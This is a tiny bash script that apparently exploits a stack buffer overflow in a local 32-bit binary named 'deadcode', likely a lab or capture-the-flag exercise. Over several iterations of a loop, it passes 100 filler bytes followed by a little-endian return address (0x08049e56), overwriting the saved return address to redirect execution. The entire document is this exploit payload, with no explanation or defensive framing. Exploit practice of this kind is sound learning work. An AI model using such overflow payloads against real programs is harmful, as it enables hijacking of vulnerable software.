#!/bin/bash

for i in {100..105};
do
./deadcode $(perl -e 'print "A" x 100 . "\x56\x9e\x04\x08"')
done
